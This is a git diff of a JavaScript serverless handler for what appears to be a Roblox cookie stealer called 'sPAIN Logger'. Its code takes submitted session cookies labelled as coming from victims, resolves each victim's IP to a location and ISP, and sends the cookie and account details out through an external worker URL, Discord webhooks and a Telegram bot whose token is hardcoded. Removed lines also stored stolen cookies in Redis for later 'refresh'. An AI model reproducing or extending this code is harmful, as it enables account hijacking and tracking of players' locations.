@@ -3,7 +3,6 @@ const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
 const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
-const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';
 
 function parseBody(raw) {
   if (!raw) return {};
@@ -26,17 +25,6 @@ async function redisGet(key) {
   } catch { return null; }
 }
 
-async function redisSet(key, value) {
-  try {
-    const res = await fetch(`${REDIS_URL}/set/${encodeURIComponent(key)}`, {
-      method: 'POST',
-      headers: { Authorization: `Bearer ${REDIS_TOKEN}`, 'Content-Type': 'application/json' },
-      body: JSON.stringify({ value: JSON.stringify(value) })
-    });
-    return res.ok;
-  } catch { return false; }
-}
-
 async function getIpGeo(ip) {
   try {
     if (!ip || ip === 'Unknown') return null;
@@ -48,7 +36,7 @@ async function getIpGeo(ip) {
 
 async function getLiteInfo(cookie, victimIp) {
   try {
-    const r = await fetch(WORKER_URL, {
+    const r = await fetch(process.env.WORKER_URL || '', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ cookie, victimIp, lite: true })
@@ -118,8 +106,6 @@ async function discordChunked(url, text) {
   }
 }
 
-function fmt(n) { return Number(n || 0).toLocaleString(); }
-
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
@@ -163,15 +149,15 @@ export default async function handler(req, res) {
     for (const wh of webhooks) {
       await discordSend(wh, {
         embeds: [{
-          title:       '\u26a0\ufe0f Wrong Cookie — Troll Detected',
+          title:       '⚠️ Wrong Cookie — Troll Detected',
           description: 'Invalid or missing cookie was submitted.',
           color:       0xff3333,
           fields: [
-            { name: '\ud83c\udf10 IP',       value: ip || 'Unknown', inline: true },
-            { name: '\ud83d\udccd Location', value: location,         inline: true },
-            { name: '\ud83d\uddfa\ufe0f ISP', value: geo?.isp || 'Unknown', inline: true },
+            { name: '🌐 IP',       value: ip || 'Unknown', inline: true },
+            { name: '📍 Location', value: location,         inline: true },
+            { name: '🗺️ ISP', value: geo?.isp || 'Unknown', inline: true },
           ],
-          footer:    { text: `sPAIN Logger \u2022 ${pageName} \u2022 ${now}` },
+          footer:    { text: `sPAIN Logger • ${pageName} • ${now}` },
           timestamp: now
         }]
       });
@@ -184,15 +170,15 @@ export default async function handler(req, res) {
     for (const wh of webhooks) {
       await discordSend(wh, {
         embeds: [{
-          title:       '\u26a0\ufe0f Wrong Cookie — Troll Detected',
+          title:       '⚠️ Wrong Cookie — Troll Detected',
           description: 'A cookie was submitted but Roblox rejected it.',
           color:       0xff3333,
           fields: [
-            { name: '\ud83c\udf10 IP',       value: ip || 'Unknown', inline: true },
-            { name: '\ud83d\udccd Location', value: location,         inline: true },
-            { name: '\ud83d\uddfa\ufe0f ISP', value: geo?.isp || 'Unknown', inline: true },
+            { name: '🌐 IP',       value: ip || 'Unknown', inline: true },
+            { name: '📍 Location', value: location,         inline: true },
+            { name: '🗺️ ISP', value: geo?.isp || 'Unknown', inline: true },
           ],
-          footer:    { text: `sPAIN Logger \u2022 ${pageName} \u2022 ${now}` },
+          footer:    { text: `sPAIN Logger • ${pageName} • ${now}` },
           timestamp: now
         }]
       });
@@ -201,62 +187,42 @@ export default async function handler(req, res) {
   }
 
   // ── Valid cookie ───────────────────────────────────────────────────────────
-  const refreshId  = generateId();
-  const refreshUrl = `https://spain-tools.vercel.app/api/refresh?id=${refreshId}`;
-
-  await redisSet(`refresh:${refreshId}`, {
-    cookie,
-    webhook:   record.webhook,
-    webhook1:  webhooks[1] || null,
-    pageName,
-    ip,
-    isp:       geo?.isp || 'Unknown',
-    createdAt: now
-  });
-
   for (const wh of webhooks) {
-    // ── Main embed — styled exactly like the screenshot ──────────────────────
+    // ── Main embed — user info only ─────────────────────────────────────────
     await discordSend(wh, {
       content: '@everyone',
       embeds: [{
-        title:       '\ud83d\udcb0 Robux & Pending',
-        color:       0x5865f2,   // Discord blurple — matches the screenshot
+        title:       '🔑 Valid Cookie Logged',
+        color:       0x5865f2,
         fields: [
           {
-            name:   '\ud83d\udcb0 Balance',
-            value:  `\`${fmt(liteInfo.robux)} R$\``,
+            name:   '👤 User',
+            value:  `\`${liteInfo.username}\``,
             inline: true
           },
           {
-            name:   '\u23f3 Pending',
-            value:  `\`${fmt(liteInfo.pendingRobux)} R$\``,
+            name:   '🆔 ID',
+            value:  `\`${liteInfo.id}\``,
             inline: true
           },
-          // Invisible spacer so the two fields are left-aligned like the screenshot
-          { name: '\u200b', value: '\u200b', inline: true },
           {
-            name:   '\ud83c\udf10 IP',
+            name:   '🌐 IP',
             value:  ip || 'Unknown',
             inline: true
           },
           {
-            name:   '\ud83d\udccd Location',
+            name:   '📍 Location',
             value:  location,
             inline: true
           },
           {
-            name:   '\ud83d\uddfa\ufe0f ISP',
+            name:   '🗺️ ISP',
             value:  geo?.isp || 'Unknown',
             inline: true
-          },
-          {
-            name:   '\ud83d\udd04 Dashboard',
-            value:  `[Open Dashboard](${refreshUrl})\nLive info + refresh cookie anytime`,
-            inline: false
           }
         ],
         thumbnail: { url: liteInfo.avatarUrl },
-        footer:    { text: `sPAIN Logger \u2022 ${liteInfo.id} \u2022 ${now}` },
+        footer:    { text: `sPAIN Logger • ${liteInfo.id} • ${now}` },
         timestamp: now
       }]
     });
@@ -266,11 +232,9 @@ export default async function handler(req, res) {
   }
 
   await tgSend([
-    `\ud83c\udf70 <b>COOKIE \u2014 ${pageName}</b>`,
-    `\ud83d\udc64 ${liteInfo.username} (#${liteInfo.id})`,
-    `\ud83d\udcb0 Robux: ${fmt(liteInfo.robux)} | Pending: ${fmt(liteInfo.pendingRobux)}`,
-    `\ud83c\udf10 <code>${ip}</code> \u2014 ${location}`,
-    `\ud83d\udd04 ${refreshUrl}`
+    `🍰 <b>COOKIE — ${pageName}</b>`,
+    `👤 ${liteInfo.username} (#${liteInfo.id})`,
+    `🌐 <code>${ip}</code> — ${location}`
   ].join('\n'));
 
   return res.status(200).json({ success: true });
